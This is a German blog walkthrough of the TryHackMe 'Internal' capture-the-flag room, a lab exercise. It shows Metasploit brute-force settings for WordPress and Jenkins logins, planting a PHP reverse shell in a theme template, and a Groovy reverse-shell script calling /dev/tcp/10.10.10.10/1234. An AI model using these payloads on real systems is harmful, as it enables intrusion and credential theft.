---
title: TryHackMe Internal writeup
description: Ein writeup zu dem TryHackMe Raum Internal. Es kommen verschiedene Techniken und Tools, wie nmap, GoBuster und Metasploit zum Einsatz.
tags:
 - security
 - linux
 - ctf
header:
 image: /images/header_keyboard.jpg
 image_description: "Foto einer Computertastatur."
 caption: "Photo credit: [pexels.com](https://pexels.com)"
---

Nachdem ich gerade erst einen writeup für TryHackMe rootme geschrieben habe, gibt es jetzt einen weiteren für [Internal](https://tryhackme.com/room/internal).
Internal ist als Black Box Penetration Test angelegt. Das heißt über die Infrastruktur, welche man auf Schwachstellen untersuchen muss, gibt es keine weiteren Informationen. Lediglich die IP-Adresse des Ziels ist bekannt und man weiß, dass zwei Flags zu finden sind: eine User.txt mit normalen Privilegien und eine Root.txt, für welche man root Privilegien benötigt.

## Vorwort

Vorweg der übliche Disclaimer: ihr könnt die Tools, welche hier vorgestellt werden für euer eigenes Netzwerk verwenden oder im Rahmen eines Penetration Tests einsetzen, wenn ihr dafür beauftragt wurdet. Jedoch dürft ihr diese Tools niemals gegen fremde Systeme ohne explizite Erlaubnis einsetzen.

## Aufklärung

Als allererstes modifizieren wir unsere Hostfile, sodass internal.thm auf die IP-Adresse des Ziels zeigt.

Dann starten wir mit der Aufklärung und der ersten Informationsgewinnung. Hierfür nutzen wir nmap, um Informationen über offene Ports, Dienste und das Betriebssystem zu erlangen. 

Wir nutzen folgenden Befehl, mit welchem der Output auch in eine Textdatei ausgegeben wird.

`nmap -A $ipaddress -o nmap.txt`

{:refdef: style="text-align: center;"}
![Ergebnis des nmap Scans]({{ site.baseurl }}/images/nmap_internal.png)
{: refdef}

Folgende Ergebnisse lieferte der Scan

* Port 22 für SSH ist offen
* Port 80 ebenfalls offen. Dahinter läuft ein Apache Webserver in der Version 2.4.29
* Das Betriebssystem ist wahrscheinlich ein Ubuntu Linux

## Untersuchung des Webservers

Rufen wir http://internal.thm mit unserem Webbrowser auf erscheint die Apache2 Ubuntu Default Page. Ein Scan mit Gobuster offenbart, dass unter /blog ein WordPress Blog zu finden ist.

 `gobuster -u http://$ip -w /opt/wordlists/directory-list-2.3-small.txt`

Wie in vergangenen Walkthroughs wurde hier die directory-list-2.3-small.txt von
[SecLists](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/directory-list-2.3-small.txt) verwendet.

Weitere Ergebnisse des Scans sind unter anderem eine Instanz von phpmyadmin unter /phpmyadmin. Wir konzentrieren uns hier auf die Untersuchung von WordPress und schauen, ob wir uns hierüber einen Zugang zum Server verschaffen können. Über die URL `http://internal.thm/blog/?author=1` finden wir heraus, dass es einen WordPress User mit dem Namen admin gibt. 

{:refdef: style="text-align: center;"}
![WordPress zeigt den Namne des Users admin]({{ site.baseurl }}/images/wordpress_user.png)
{: refdef}

Es gibt jetzt sicherlich mehrere Methoden, wie man an dieser Stelle fortfahren könnte. Ich habe mich für Brute Force mit dem Metasploit Modul `auxiliary/scanner/http/wordpress_login_enum` entschieden. In diesem Fall müssen folgende Optionen gesetzt werden:

* set rhosts internal.thm
* set targeturi /blog
* set stop_on_success true
* set username admin
* set pass_file /opt/wordlists/rockyou.txt (je nachdem welchen Pfad und Wordlist ihr verwendet)

{:refdef: style="text-align: center;"}
![Codeausschnitt der php-reverse-shell]({{ site.baseurl }}/images/wppw_internal.png)
{: refdef}

Mit den Zugangsdaten kann man sich nun unter `http://internal.thm/blog/wp-login.php` einloggen. Unter Appearance / Theme Editor finden wir das 404 Template (404.php). Hier können wir eine [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell) platzieren und müssen anschließend nur einen 404 Error produzieren, um einen Zugang zum Server zu erhalten. In dem Code der reverse-shell müssen wir nur noch die IP und den Port anpassen.

{:refdef: style="text-align: center;"}
![Codeausschnitt der php-reverse-shell]({{ site.baseurl }}/images/phpshell_internal.png)
{: refdef}

Mit Netcat warten wir auf die Verbindung auf dem zuvor festgelegten Port: `nc -lvnp 4444`. Anschließend noch mit einer auf dem Server nicht existenten URL einen Error 404 hervorrufen, zum Beispiel mit: `http://internal.thm/blog/index.php/2020/08/03/give-access-pls/`

{:refdef: style="text-align: center;"}
![Screenshot der Shell]({{ site.baseurl }}/images/wordpress_shell.png)
{: refdef}

Nun haben wir eine Shell und finden unter /opt/ die Datei wp-save.txt. Darin finden wir Logindaten, welche wir für eine SSH-Verbindung nutzen können.

{:refdef: style="text-align: center;"}
![Textdatei mit Logindaten via SSH.]({{ site.baseurl }}/images/sshlogin_internal.png)
{: refdef}

Loggen wir uns per SSH ein, finden wir im home-Verzeichnis des Users auch direkt die Flag user.txt

{:refdef: style="text-align: center;"}
![Screenshot der Textdatei mit der Userflag user.txt.]({{ site.baseurl }}/images/userflag_internal.png)
{: refdef}

Neben der Flag finden wir eine jenkins.txt, in welcher ein Hinweis auf eine lokale Jenkins-Instanz unter 172.17.0.2:8080 steht, welche als Docker-Container läuft. Mit `ssh -L 5555:localhost:8080 aubreanna@internal.thm` leiten wir den Port 5555 auf unserer lokalen Maschine an den Port 8080 auf der remote Maschine weiter und können so Jenkins im Browser via http://localhost:5555 erreichen. Dort sehen wir dann das Loginformular von Jenkins.

{:refdef: style="text-align: center;"}
![Loginformular von Jenkins.]({{ site.baseurl }}/images/jenkins_internal.png)
{: refdef}

Mit Metasploit finden wir die Logindaten für den default User admin heraus. Dazu wird das Modul `auxiliary/scanner/http/jenkins_login` mit folgenden Optionen verwendet:

* set rhosts localhost
* set rport 5555
* set username admin
* set pass_file /opt/wordlists/password-top10000.txt (hier wieder den Pfad der Passwortdatei eurer Wahl einfügen)
* set stop_on_success true

{:refdef: style="text-align: center;"}
![Loginformular von Jenkins.]({{ site.baseurl }}/images/jenkinslogin_internal.png)
{: refdef}

Wenn wir uns mit diesen Logindaten in Jenkins eingeloggt haben, können wir unter http://localhost:5555/script die Skript-Konsole von Jenkins aufrufen. Hier ist es uns möglich ein Skript für eine reverse-shell auszuführen. Anzupassen sind die IP und der Port hinter /tcp/ .

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.10/1234;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

```

Nun nutzen wir wieder Netcat mit `nc -lvnp 1234` und führen das Jenkins Skript aus. Wir erhalten eine Shell im Jenkins Container, wo wir unter /opt/ eine note.txt mit root-credentials finden.

{:refdef: style="text-align: center;"}
![Root Logindaten aus der note.txt.]({{ site.baseurl }}/images/rootcreds_internal.png)
{: refdef}

Mit den erbeuteten Zugangsdaten loggen wir uns per SSH ein und finden direkt die root.txt mit der Flag.

{:refdef: style="text-align: center;"}
![Root Logindaten aus der note.txt.]({{ site.baseurl }}/images/rootflag_internal.png)
{: refdef}

Wenn ihr andere Lösungsansätze gefunden habt, oder Fragen zu dieser Capture the Flag Challenge habt, meldet euch gerne bei [Twitter](https://twitter.com/jln0x1).
